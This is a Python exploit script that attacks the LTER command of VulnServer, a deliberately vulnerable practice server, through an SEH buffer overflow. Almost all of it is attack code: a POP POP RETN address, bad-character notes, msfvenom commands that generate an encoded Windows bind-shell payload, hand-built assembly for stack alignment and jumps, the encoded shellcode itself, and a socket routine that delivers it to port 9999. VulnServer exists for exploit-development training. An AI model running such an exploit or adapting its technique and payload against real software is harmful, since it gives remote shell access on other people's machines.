# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in VulnServer. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.

# 0x6250195E - POP POP RETN 
# badchars: \x00 \x0A \x0D and \x80 onwards
# Long jump: E91FFAFFFF        jmp 0xfffffa24 1500 bytes
# Command to encode long jump: msfvenom -p generic/custom PAYLOADFILE=jmp.bin -e x86/alpha_mixed -f python BufferRegister=EAX
# Command to generate shellcode: msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.10 LPORT=4444 -b '\x00\x0A\x0D' -e x86/alpha_mixed BufferRegister=EAX -f python


# Flow of Events
# 1. Hit POP POP RETN
# 2. Do a short jump over SEH 
# 	 00C0FFDC   74 06            JE SHORT 00C0FFE4
# 3. Carve out EB80 in limited buffer space
#
#	 00C0FFE4   54               PUSH ESP
#	 00C0FFE5   58               POP EAX
#	 00C0FFE6   66:05 5411       ADD AX,1154
#	 00C0FFEA   04 54            ADD AL,54
#	 00C0FFEC   50               PUSH EAX
#	 00C0FFED   5C               POP ESP
#	 00C0FFEE   66:2D 0C7F       SUB AX,7F0C
#	 00C0FFF2   2C 01            SUB AL,1
#	 00C0FFF4   66:50            PUSH AX
#
# 4. Jump up 126 bytes
# 5. Align stack - Execution of shellcode overwrites stack (and thus the original shellcode) if stack is not aligned.
#
#	 00C0FF7E   04 04            ADD AL,4
#	 00C0FF80   66:05 097F       ADD AX,7F09
#	 00C0FF84   2C 54            SUB AL,54
#	 00C0FF86   66:2D 5411       SUB AX,1154
#	 00C0FF8A   50               PUSH EAX
#	 00C0FF8B   5C               POP ESP
#
# 6. Align EAX for long jump backwards 
#
#	 00C0FF8E   66:05 4811       ADD AX,1148
#
# 7. Jump back 1500 bytes
# 8. Align EAX for shellcode
#
#	 00C0FA82   54               PUSH ESP
#	 00C0FA83   58               POP EAX
#	 00C0FA84   66:05 2506       ADD AX,625
# 	 00C0FA88   66:05 2506       ADD AX,625
#
# 9. Run Shellcode



import sys
import socket

#Encoded long jump

jmp =  ""
jmp += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
jmp += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
jmp += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
jmp += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
jmp += "\x6a\x49\x77\x6f\x38\x7a\x59\x6f\x59\x6f\x41\x41"

#Encoded Shellcode

buf =  ""
buf += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x6b\x4c\x49\x78\x6f\x72\x47\x70\x37\x70\x77\x70\x65"
buf += "\x30\x6f\x79\x7a\x45\x56\x51\x39\x50\x30\x64\x6c\x4b"
buf += "\x76\x30\x34\x70\x4c\x4b\x36\x32\x56\x6c\x6e\x6b\x31"
buf += "\x42\x32\x34\x4e\x6b\x33\x42\x34\x68\x54\x4f\x4e\x57"
buf += "\x50\x4a\x51\x36\x34\x71\x6b\x4f\x6e\x4c\x35\x6c\x45"
buf += "\x31\x71\x6c\x66\x62\x66\x4c\x61\x30\x6f\x31\x4a\x6f"
buf += "\x34\x4d\x65\x51\x79\x57\x6b\x52\x5a\x52\x66\x32\x50"
buf += "\x57\x6e\x6b\x71\x42\x52\x30\x6c\x4b\x71\x5a\x65\x6c"
buf += "\x6c\x4b\x72\x6c\x37\x61\x43\x48\x5a\x43\x32\x68\x76"
buf += "\x61\x78\x51\x42\x71\x4c\x4b\x71\x49\x37\x50\x57\x71"
buf += "\x4e\x33\x6c\x4b\x32\x69\x46\x78\x58\x63\x67\x4a\x61"
buf += "\x59\x4e\x6b\x66\x54\x6e\x6b\x43\x31\x4e\x36\x55\x61"
buf += "\x79\x6f\x4c\x6c\x4a\x61\x7a\x6f\x64\x4d\x33\x31\x78"
buf += "\x47\x44\x78\x6b\x50\x61\x65\x38\x76\x66\x63\x53\x4d"
buf += "\x48\x78\x57\x4b\x31\x6d\x71\x34\x42\x55\x6d\x34\x46"
buf += "\x38\x6c\x4b\x56\x38\x46\x44\x36\x61\x78\x53\x42\x46"
buf += "\x6e\x6b\x36\x6c\x62\x6b\x4e\x6b\x36\x38\x47\x6c\x66"
buf += "\x61\x49\x43\x4c\x4b\x73\x34\x6e\x6b\x56\x61\x4e\x30"
buf += "\x4b\x39\x73\x74\x57\x54\x34\x64\x71\x4b\x61\x4b\x75"
buf += "\x31\x63\x69\x61\x4a\x32\x71\x59\x6f\x59\x70\x31\x4f"
buf += "\x53\x6f\x52\x7a\x4c\x4b\x75\x42\x38\x6b\x6c\x4d\x73"
buf += "\x6d\x72\x48\x44\x73\x66\x52\x53\x30\x75\x50\x50\x68"
buf += "\x64\x37\x42\x53\x75\x62\x51\x4f\x56\x34\x50\x68\x42"
buf += "\x6c\x34\x37\x75\x76\x53\x37\x69\x6f\x58\x55\x38\x38"
buf += "\x6c\x50\x43\x31\x47\x70\x47\x70\x65\x79\x69\x54\x46"
buf += "\x34\x70\x50\x52\x48\x46\x49\x6b\x30\x32\x4b\x65\x50"
buf += "\x79\x6f\x38\x55\x32\x4a\x53\x38\x66\x39\x66\x30\x7a"
buf += "\x42\x79\x6d\x63\x70\x62\x70\x61\x50\x66\x30\x75\x38"
buf += "\x78\x6a\x54\x4f\x79\x4f\x6b\x50\x39\x6f\x38\x55\x4c"
buf += "\x57\x51\x78\x44\x42\x37\x70\x74\x51\x73\x6c\x6f\x79"
buf += "\x4b\x56\x50\x6a\x72\x30\x46\x36\x50\x57\x45\x38\x68"
buf += "\x42\x69\x4b\x50\x37\x63\x57\x4b\x4f\x4a\x75\x33\x67"
buf += "\x33\x58\x58\x37\x6a\x49\x77\x48\x69\x6f\x79\x6f\x4e"
buf += "\x35\x72\x77\x45\x38\x63\x44\x38\x6c\x57\x4b\x6d\x31"
buf += "\x79\x6f\x59\x45\x63\x67\x6e\x77\x50\x68\x72\x55\x50"
buf += "\x6e\x50\x4d\x45\x31\x79\x6f\x68\x55\x65\x38\x62\x43"
buf += "\x70\x6d\x62\x44\x75\x50\x6d\x59\x38\x63\x32\x77\x33"
buf += "\x67\x71\x47\x36\x51\x4a\x56\x61\x7a\x77\x62\x53\x69"
buf += "\x33\x66\x4d\x32\x69\x6d\x43\x56\x7a\x67\x53\x74\x67"
buf += "\x54\x37\x4c\x36\x61\x53\x31\x6c\x4d\x67\x34\x34\x64"
buf += "\x66\x70\x38\x46\x43\x30\x77\x34\x71\x44\x52\x70\x51"
buf += "\x46\x32\x76\x31\x46\x42\x66\x76\x36\x30\x4e\x56\x36"
buf += "\x43\x66\x73\x63\x33\x66\x33\x58\x73\x49\x7a\x6c\x57"
buf += "\x4f\x6f\x76\x69\x6f\x38\x55\x4b\x39\x39\x70\x42\x6e"
buf += "\x36\x36\x70\x46\x69\x6f\x66\x50\x75\x38\x35\x58\x4d"
buf += "\x57\x65\x4d\x33\x50\x79\x6f\x58\x55\x4f\x4b\x6c\x30"
buf += "\x6c\x75\x6d\x72\x46\x36\x65\x38\x49\x36\x6f\x65\x4d"
buf += "\x6d\x4d\x4d\x4b\x4f\x68\x55\x77\x4c\x33\x36\x73\x4c"
buf += "\x55\x5a\x6b\x30\x79\x6b\x69\x70\x31\x65\x77\x75\x4f"
buf += "\x4b\x37\x37\x47\x63\x33\x42\x72\x4f\x52\x4a\x53\x30"
buf += "\x62\x73\x49\x6f\x4a\x75\x41\x41"







s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

evilString = "/.../" + "A"*2124 
evilString += "\x54\x58\x66\x05\x25\x06\x66\x05\x25\x06"+ "E"*10 
evilString += buf + "A"*546 
evilString += "\x04\x04\x66\x05\x09\x7F\x2C\x54\x66\x2D\x54\x11\x50\x5C" + "AA" 
evilString += "\x66\x05\x48\x11\x41\x41\x41\x41\x41\x41" 
evilString += jmp + "A"*4 
evilString += "\x74\x06\x48\x48" 
evilString += "\x5E\x19\x50\x62" 
evilString += "\x54\x58\x66\x05\x54\x11\x04\x54\x50\x5c\x66\x2d\x0C\x7F\x2C\x01\x66\x50" +"D"*1490

command = "LTER " + evilString

s.connect(('192.168.1.10',9999))
s.recv(1024)
s.send(command)
s.close()
